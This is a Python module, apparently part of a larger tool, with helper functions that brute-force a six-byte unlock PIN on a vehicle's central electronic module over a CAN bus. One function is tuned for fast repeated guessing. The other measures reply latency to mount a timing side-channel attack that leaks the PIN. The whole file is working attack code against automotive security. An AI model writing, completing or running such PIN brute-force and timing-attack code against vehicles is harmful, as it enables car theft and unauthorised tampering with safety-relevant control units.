import can
import time
from ..config import CMD_UNLOCK_REPLY

def unlock_attempt_fast(bus, tx_msg, cem_id, shuffle, pin_bytes):
    """
    Optimized unlock attempt for Brute Force.
    Returns: True if success, False otherwise.
    """
    # Update reusable message data in place
    d = tx_msg.data
    d[0] = cem_id
    d[1] = 0xBE # CMD_UNLOCK
    
    # Apply shuffle
    s = shuffle
    d[2 + s[0]] = pin_bytes[0]
    d[2 + s[1]] = pin_bytes[1]
    d[2 + s[2]] = pin_bytes[2]
    d[2 + s[3]] = pin_bytes[3]
    d[2 + s[4]] = pin_bytes[4]
    d[2 + s[5]] = pin_bytes[5]
    
    try:
        bus.send(tx_msg)
    except can.CanError:
        return False

    # Wait for reply
    # Increased timeout to 20ms to be safer
    msg = bus.recv(timeout=0.02)
    
    if msg:
        # Filters ensure we only get relevant IDs. Check content.
        # Reply: [CEM_ID, 0xB9, 0x00...]
        if len(msg.data) > 2 and msg.data[1] == CMD_UNLOCK_REPLY and msg.data[2] == 0x00:
            return True
            
    return False

def unlock_attempt_timing(bus, tx_msg, cem_id, shuffle, pin_bytes):
    """
    Unlock attempt with timing measurement.
    Returns: (success, latency)
    """
    # Re-use logic but with timestamps
    d = tx_msg.data
    d[0] = cem_id
    d[1] = 0xBE # CMD_UNLOCK
    s = shuffle
    for i in range(6): d[2 + s[i]] = pin_bytes[i]
    
    while bus.recv(timeout=0): pass # Drain for precision
    
    try:
        bus.send(tx_msg)
        t_send = time.time()
    except can.CanError:
        return False, 0

    # Wait longer for timing attack to ensure we catch it? 
    # The latency is the key.
    start = time.time()
    while time.time() - start < 0.1:
        rx = bus.recv(timeout=0.02)
        if rx and len(rx.data) > 2 and rx.data[0] == cem_id:
            t_recv = rx.timestamp or time.time()
            if rx.data[1] == CMD_UNLOCK_REPLY and rx.data[2] == 0x00:
                return True, t_recv - t_send
            return False, t_recv - t_send # Return latency even on failure
    
    return False, 0
